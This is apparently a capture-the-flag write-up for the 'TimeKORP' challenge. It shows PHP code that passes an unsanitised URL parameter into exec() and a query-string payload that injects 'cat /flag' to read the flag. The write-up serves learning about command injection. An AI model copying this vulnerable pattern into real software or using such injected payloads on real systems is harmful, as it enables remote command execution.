# TimeKORP Challenge

## Description:
Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.

### Key Point:
The vulnerability exploited in this challenge is **command line injection**.

---

## Solution:

The vulnerability lies in the `/models/TimeModel.php` file. The code for constructing and executing the command is as follows:

```php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res = isset($time) ? $time : '?';
        return $res;
    }
}
'''

you can see that it execute the command "$this->command" using "$time = exec($this->command);"
directly without sanatizing it.
We, then, can see the vulnabiltiy here where we can use command injection.

In the url of the problem which something like this:
http://94.237.54.201:30280/?format=%H:%M:%S

we change it to:
http://94.237.54.201:30280/?format="';cat /flag' ||'

and then boom the flag got display in the web page.

Explain: "';cat /flag ||'
'; :is a command seperator in shell scripting it si use so that the 'date' command has ended here.

cat /flag :self-explanatory. It is use for displaying the flag.

|| :is a logical OR operator in shell scripting. This part is used to ensure that, 
even if something goes wrong (e.g., /flag doesn’t exist, or there's a permission issue), 
the rest of the command doesn’t break, and execution continues smoothly. 

and that is it for me.
